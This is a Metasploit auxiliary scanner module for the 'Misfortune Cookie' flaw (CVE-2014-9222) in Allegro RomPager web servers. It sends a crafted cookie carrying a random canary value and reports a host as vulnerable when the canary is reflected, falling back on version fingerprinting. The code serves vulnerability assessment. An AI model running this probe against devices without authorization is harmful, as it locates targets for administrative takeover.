##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => "Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Scanner",
      'Description' => %q(
        This module scans for HTTP servers that appear to be vulnerable to the
        'Misfortune Cookie' vulnerability which affects Allegro Software
        Rompager versions before 4.34 and can allow attackers to authenticate
        to the HTTP service as an administrator without providing valid
        credentials, however more specifics are not yet known.
      ),
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>', # metasploit module
        'Lior Oppenheim' # CVE-2014-9222
      ],
      'References' => [
        ['CVE', '2014-9222'],
        ['URL', 'http://mis.fortunecook.ie'],
        ['URL', 'http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices
        ['URL', 'http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC
      ],
      'DisclosureDate' => 'Dec 17 2014',
      'License' => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'URI to test', '/'])
      ], Exploit::Remote::HttpClient
    )
  end

  def check_host(_ip)
    begin
      test_misfortune
    ensure
      disconnect
    end
  end

  def run_host(ip)
    case check_host(ip)
    when Exploit::CheckCode::Appears
      print_good("#{peer} is vulnerable")
    when Exploit::CheckCode::Detected
      print_good("#{peer} uses a vulnerable version")
    else
      vprint_status("#{peer} is not vulnerable")
    end
  end

  def find_canary_uri
    vprint_status("#{peer} locating suitable canary URI")
    0.upto(4) do
      canary = '/' + Rex::Text.rand_text_alpha(16)
      res = send_request_raw('uri' => normalize_uri(canary), 'method' => 'GET', 'headers' => headers)
      # in most cases, the canary URI will not exist and will return a 404, but if everything under
      # TARGETURI is protected by auth, that may be fine too
      return canary if res.code == 401 || res.code == 404
    end
    nil
  end

  def headers
    {
      'Referer' => datastore['SSL'] ? 'https' : 'http' + "://#{rhost}:#{rport}"
    }
  end

  def requires_auth?
    res = send_request_raw(
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => 'GET',
      'headers' => headers
    )
    return false unless res

    http_fingerprint(response: res)
    if res.code == 401
      vprint_status("#{peer} requires authentication for #{target_uri.path}")
      true
    else
      vprint_status("#{peer} does not require authentication for #{target_uri.path} -- code #{res.code}")
      false
    end
  end

  def test_misfortune
    return Exploit::CheckCode::Unknown unless requires_auth?

    # find a usable canary URI (one that 401/404s already)
    unless canary = find_canary_uri
      vprint_error("#{peer} Unable to find a suitable canary URI")
      return Exploit::CheckCode::Unknown
    end

    # Make a request containing a malicious cookie with the canary value.
    # If that canary shows up in the *body*, they are vulnerable
    res = send_request_raw(
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => 'GET',
      'headers' => headers.merge('Cookie' => "C107373883=#{canary}")
    )

    unless res
      vprint_error("#{peer} no response")
      return Exploit::CheckCode::Unknown
    end

    # fingerprint because this is useful and also necessary if the canary is not
    # in the body
    fp = http_fingerprint(response: res)

    unless res.body
      vprint_status("#{peer} HTTP code #{res.code} had no body")
      return Exploit::CheckCode::Unknown
    end

    if res.body.include?(canary)
      vprint_good("#{peer} HTTP code #{res.code} response contained canary URI #{canary}")
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references
      )
      return Exploit::CheckCode::Appears
    end

    vprint_status("#{peer} HTTP code #{res.code} response did not contain canary URI #{canary}")
    if /RomPager\/(?<version>[\d\.]+)/ =~ fp
      vprint_status("#{peer} is RomPager #{version}")
      if Gem::Version.new(version) < Gem::Version.new('4.34')
        return Exploit::CheckCode::Detected
      end
    end

    # TODO: ensure that the canary page doesn't exist in the first place
    # (returns a 404), and then ensure that the malcious request with the
    # carary in the cookie then returns a 404.
    Exploit::CheckCode::Safe
  end
end
